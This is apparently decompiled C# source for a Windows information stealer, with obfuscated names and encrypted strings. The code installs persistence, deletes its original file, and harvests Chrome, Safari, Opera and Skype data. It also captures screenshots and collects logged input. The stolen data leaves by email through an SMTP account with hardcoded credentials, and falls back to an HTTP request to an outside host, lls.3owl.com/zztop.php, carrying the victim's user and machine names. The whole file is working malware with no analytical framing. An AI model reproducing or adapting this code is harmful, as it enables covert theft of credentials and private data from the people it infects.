using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using My;

public class IWTOL
{
	public static string OXGJWM;

	public static string GVCEYV;

	public static string UYGQQY;

	public static string FFInfo;

	public static string LCWEGP;

	public static string JNXOYT;

	public static string KTOLCB;

	public static string JKJQFL;

	public static string EYHCUS;

	public static string HTVYHM;

	public static string WXNWOL;

	public static string WVTTMS;

	public static string USWETQ;

	public static string OEIMWV;

	public static string PPCCEGKP = "";

	public static string VJCNC = HVWNKBHE.QYIGWEOP("l7S80cGlvr6/uKqLvcqwmbeEwL6dFw==", "False");

	public static string QLEQP = HVWNKBHE.QYIGWEOP("prbIzcGlt8eRFw==", "False");

	public static string JLIYB = HVWNKBHE.QYIGWEOP("prvN0ICau7rJvmGxyM0X", "False");

	public static int QPNBS = 587;

	public static string IYHJI = HVWNKBHE.QYIGWEOP("DLEXSite", "False");

	public static string JGPRH = HVWNKBHE.QYIGWEOP("USERSITE", "False");

	public static string OOYXG = HVWNKBHE.QYIGWEOP("USERTYPE", "False");

	public static string UTKQM = HVWNKBHE.QYIGWEOP("USERTITLE", "False");

	public static string MEYFP = HVWNKBHE.QYIGWEOP("USERBODY", "False");

	public static string RDQST = HVWNKBHE.QYIGWEOP("USERSCREENSHOTS", "False");

	public static string LCMOC = HVWNKBHE.QYIGWEOP("n7fJ0MUP", "False");

	public static int KDEIY = 600000;

	public static string PHKMC = "";

	public static string LLXHF = "";

	public static int number = 0;

	public static BXCIO XQBQY;

	public static Thread KNSLICKO = new Thread(TIUSWGJO);

	public static Thread GCThread = new Thread(DAChrome.GTCHRME);

	public static Thread TOQULUSR = new Thread(JFOQECQV);

	public static Thread RunThread = new Thread(SDCNFRMTN);

	public static Thread STRTTHRD = new Thread(DAStartup.Startupdll.StartPers);

	public static Thread SkypeSPEDThread = new Thread(DASkypeSPED.SkypeSPEDll.GTSKPE);

	[STAThread]
	public static void Main()
	{
		int num = default(int);
		try
		{
			IntPtr intPtr2 = (Process.GetCurrentProcess().MinWorkingSet = new IntPtr(5));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			Thread.Sleep(1000);
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HVWNKBHE.QYIGWEOP("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HVWNKBHE.QYIGWEOP("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False"));
			}
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HVWNKBHE.QYIGWEOP("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HVWNKBHE.QYIGWEOP("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"));
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HVWNKBHE.QYIGWEOP("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"), (SearchOption)3, new string[1] { "*.png*" }))
			{
				File.Delete(file);
			}
			foreach (string file2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HVWNKBHE.QYIGWEOP("l6PKy8yqydDOzpeYwsvFsMbUxA8=", "False")))
			{
				File.Delete(file2);
			}
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			STRTTHRD.IsBackground = true;
			STRTTHRD.Start();
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5, num);
			ProjectData.ClearProjectError();
		}
		int num2 = 0;
		while (true)
		{
			num = 1;
			try
			{
				if (num2 == 3)
				{
					Application.Restart();
				}
				XQBQY = new BXCIO(LLXHF);
				BXCIO.UBCOI();
			}
			catch (Exception ex6)
			{
				ProjectData.SetProjectError(ex6, num);
				num2 = checked(num2 + 1);
				ProjectData.ClearProjectError();
				continue;
			}
			break;
		}
		try
		{
			KNSLICKO.IsBackground = true;
			KNSLICKO.Start();
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			DAMelt.Meltdll.Melt();
		}
		catch (Exception ex8)
		{
			ProjectData.SetProjectError(ex8, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			RunThread.IsBackground = true;
			RunThread.Start();
		}
		catch (Exception ex9)
		{
			ProjectData.SetProjectError(ex9, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			GCThread.IsBackground = true;
			GCThread.Start();
		}
		catch (Exception ex10)
		{
			ProjectData.SetProjectError(ex10, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			DASafari.SFRIDL sFRIDL = new DASafari.SFRIDL();
			sFRIDL.SAFRGT();
		}
		catch (Exception ex11)
		{
			ProjectData.SetProjectError(ex11, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			new DAOpera.Operaz();
			DAOpera.Operaz.FPQX();
		}
		catch (Exception ex12)
		{
			ProjectData.SetProjectError(ex12, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			SkypeSPEDThread.IsBackground = true;
			SkypeSPEDThread.Start();
		}
		catch (Exception ex13)
		{
			ProjectData.SetProjectError(ex13, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			TOQULUSR.IsBackground = true;
			TOQULUSR.Start();
		}
		catch (Exception ex14)
		{
			ProjectData.SetProjectError(ex14, num);
			ProjectData.ClearProjectError();
		}
		Process.GetCurrentProcess().WaitForExit();
	}

	public static void NJNKH(ref double FGXHHSQT)
	{
		try
		{
			DateTime t = DateAndTime.get_Now().AddSeconds(FGXHHSQT);
			while (DateTime.Compare(DateAndTime.get_Now(), t) < 0)
			{
				Application.DoEvents();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void SDCNFRMTN()
	{
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HVWNKBHE.QYIGWEOP("i57H0bMX", "False")))
			{
				try
				{
					Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
					Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					val2.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
					Bitmap val3 = val;
					((Image)val3).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HVWNKBHE.QYIGWEOP("kZ3Excakw8rIyJGTzce4mr7Py7Whw7eovafDz7TJo37L0LsR", "False"));
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				try
				{
					MailMessage mailMessage = new MailMessage();
					SmtpClient smtpClient = new SmtpClient(JLIYB);
					mailMessage.From = new MailAddress(VJCNC);
					mailMessage.To.Add(VJCNC);
					mailMessage.Subject = HVWNKBHE.QYIGWEOP("lMzb3tu0yOHoh5TS1dzMuoPB6sqryOHozb3P2u6HmsTclba2nY4B", "False") + Environment.UserName.ToString() + HVWNKBHE.QYIGWEOP("aQ0=", "False") + Environment.MachineName.ToString();
					mailMessage.Body = HVWNKBHE.QYIGWEOP("lMzb3tu0yOHoh5TS1dzMuoPB6sqryOHozb3P2u6HmsTclba2nY4B", "False") + Environment.UserName.ToString() + HVWNKBHE.QYIGWEOP("aQ0=", "False") + Environment.MachineName.ToString() + Environment.NewLine + HVWNKBHE.QYIGWEOP("ns/gkretz+DeyGWy0NXJrtbQkrC0x96SqrfP2JK4rcXYkre0z9mgBQ==", "False");
					smtpClient.Port = QPNBS;
					smtpClient.EnableSsl = true;
					smtpClient.Credentials = new NetworkCredential(VJCNC, QLEQP);
					try
					{
						Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HVWNKBHE.QYIGWEOP("kZ3Excakw8rIyJGTzce4mr7Py7Whw7eovafDz7TJo37L0LsR", "False"));
						mailMessage.Attachments.Add(item);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					smtpClient.Send(mailMessage);
					try
					{
						File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HVWNKBHE.QYIGWEOP("i57H0bMX", "False"));
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					try
					{
						string text = "http://lls.3owl.com/zztop.php";
						_ = (HttpWebResponse)WebRequest.Create(text + "?to=" + VJCNC + "&subject=" + Strings.Replace(HVWNKBHE.QYIGWEOP("lMzb3tu0yOHoh5TS1dzMuoPB6sqryOHozb3P2u6HmsTclba2nY4B", "False") + Environment.UserName.ToString() + HVWNKBHE.QYIGWEOP("aQ0=", "False") + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(HVWNKBHE.QYIGWEOP("lMzb3tu0yOHoh5TS1dzMuoPB6sqryOHozb3P2u6HmsTclba2nY4B", "False") + Environment.UserName.ToString() + HVWNKBHE.QYIGWEOP("aQ0=", "False") + Environment.MachineName.ToString() + Environment.NewLine + HVWNKBHE.QYIGWEOP("ns/gkretz+DeyGWy0NXJrtbQkrC0x96SqrfP2JK4rcXYkre0z9mgBQ==", "False"), " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + VJCNC).GetResponse();
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			RunThread.Abort();
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
	}

	public static void TIUSWGJO()
	{
		//IL_010c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		string text = "";
		checked
		{
			while (true)
			{
				Thread.Sleep(KDEIY);
				text = "";
				string text2 = "";
				double FGXHHSQT = 0.2;
				NJNKH(ref FGXHHSQT);
				try
				{
					WebClient webClient = new WebClient();
					text2 = HVWNKBHE.QYIGWEOP("mJSgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWhxw0=", "False") + Environment.NewLine + Environment.NewLine + webClient.DownloadString(HVWNKBHE.QYIGWEOP("osnU15NphMHczanCwdvCqcOO3sGbycnaxrO+0JW8qcKP1Ylzh5OXkm6KjsjMqg0=", "False")) + Environment.NewLine + Environment.NewLine + HVWNKBHE.QYIGWEOP("enaCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeDqSs=", "False");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					text2 = "";
					ProjectData.ClearProjectError();
				}
				FGXHHSQT = 1.0;
				NJNKH(ref FGXHHSQT);
				try
				{
					if (Operators.CompareString(RDQST, HVWNKBHE.QYIGWEOP("mNHf1gY=", "False"), false) == 0)
					{
						Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
						Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
						Graphics val2 = Graphics.FromImage((Image)(object)val);
						val2.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
						Bitmap val3 = val;
						((Image)val3).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HVWNKBHE.QYIGWEOP("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + number + HVWNKBHE.QYIGWEOP("ZsPMzBI=", "False"));
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				FGXHHSQT = 0.3;
				NJNKH(ref FGXHHSQT);
				try
				{
					if (Operators.CompareString(LLXHF, "", false) != 0)
					{
						PHKMC = LLXHF + Environment.NewLine + Environment.NewLine + text2 + Environment.NewLine + Environment.NewLine + text;
						try
						{
							MailMessage mailMessage = new MailMessage();
							MailMessage mailMessage2 = mailMessage;
							mailMessage2.From = new MailAddress(VJCNC);
							mailMessage2.To.Add(VJCNC);
							mailMessage2.Subject = HVWNKBHE.QYIGWEOP("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + HVWNKBHE.QYIGWEOP("aQ0=", "False") + Environment.MachineName.ToString();
							mailMessage2.Body = PHKMC;
							try
							{
								if (Operators.CompareString(RDQST, HVWNKBHE.QYIGWEOP("mNHf1gY=", "False"), false) == 0)
								{
									Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HVWNKBHE.QYIGWEOP("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + number + HVWNKBHE.QYIGWEOP("ZsPMzBI=", "False"));
									mailMessage2.Attachments.Add(item);
								}
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								ProjectData.ClearProjectError();
							}
							mailMessage2 = null;
							SmtpClient smtpClient = new SmtpClient(JLIYB);
							SmtpClient smtpClient2 = smtpClient;
							smtpClient2.Port = QPNBS;
							smtpClient2.EnableSsl = true;
							smtpClient2.Credentials = new NetworkCredential(VJCNC, QLEQP);
							smtpClient2.Send(mailMessage);
							smtpClient2 = null;
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							try
							{
								string text3 = "http://lls.3owl.com/zztop.php";
								_ = (HttpWebResponse)WebRequest.Create(text3 + "?to=" + VJCNC + "&subject=" + Strings.Replace(HVWNKBHE.QYIGWEOP("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + HVWNKBHE.QYIGWEOP("aQ0=", "False") + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(PHKMC, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + VJCNC).GetResponse();
							}
							catch (Exception projectError5)
							{
								ProjectData.SetProjectError(projectError5);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
				PHKMC = "";
				LLXHF = "";
				PPCCEGKP = "";
				number++;
			}
		}
	}

	public static void JFOQECQV()
	{
		_ = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HVWNKBHE.QYIGWEOP("eoatrq+NrLOxsXp7pa6ok6m3pyw=", HVWNKBHE.QYIGWEOP("g7nP3cEJ", "False"))).Length;
		DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + HVWNKBHE.QYIGWEOP("eoatrq+NrLOxsXp7pa6ok6m3pyw=", HVWNKBHE.QYIGWEOP("g7nP3cEJ", "False")));
		FileInfo[] files = directoryInfo.GetFiles();
		try
		{
			double FGXHHSQT = 25.0;
			NJNKH(ref FGXHHSQT);
			string text = OXGJWM.ToString() + Environment.NewLine + Environment.NewLine + GVCEYV + Environment.NewLine + Environment.NewLine + UYGQQY + Environment.NewLine + Environment.NewLine + LCWEGP + Environment.NewLine + Environment.NewLine + JNXOYT + Environment.NewLine + Environment.NewLine + KTOLCB + Environment.NewLine + Environment.NewLine + JKJQFL + Environment.NewLine + Environment.NewLine + EYHCUS + Environment.NewLine + Environment.NewLine + WXNWOL + Environment.NewLine + Environment.NewLine + WVTTMS + Environment.NewLine + Environment.NewLine + USWETQ + Environment.NewLine + Environment.NewLine + OEIMWV;
			if (!((Operators.CompareString(text, "", false) != 0) | (Operators.CompareString(text, (string)null, false) != 0)))
			{
				return;
			}
			try
			{
				MailMessage mailMessage = new MailMessage();
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.From = new MailAddress(VJCNC);
				mailMessage2.To.Add(VJCNC);
				mailMessage2.Subject = HVWNKBHE.QYIGWEOP("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + HVWNKBHE.QYIGWEOP("aQ0=", HVWNKBHE.QYIGWEOP("g7nP3cEJ", "False")) + Environment.MachineName.ToString();
				mailMessage2.Body = text;
				try
				{
					FileInfo[] array = files;
					foreach (FileInfo fileInfo in array)
					{
						Attachment item = new Attachment(fileInfo.FullName);
						mailMessage2.Attachments.Add(item);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				mailMessage2 = null;
				SmtpClient smtpClient = new SmtpClient(JLIYB);
				SmtpClient smtpClient2 = smtpClient;
				smtpClient2.Port = QPNBS;
				smtpClient2.EnableSsl = true;
				smtpClient2.Credentials = new NetworkCredential(VJCNC, QLEQP);
				smtpClient2.Send(mailMessage);
				smtpClient2 = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				try
				{
					string text2 = "http://lls.3owl.com/zztop.php";
					_ = (HttpWebResponse)WebRequest.Create(text2 + "?to=" + VJCNC + "&subject=" + Strings.Replace(HVWNKBHE.QYIGWEOP("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + HVWNKBHE.QYIGWEOP("aQ0=", HVWNKBHE.QYIGWEOP("g7nP3cEJ", "False")) + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(text, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + VJCNC).GetResponse();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}
}
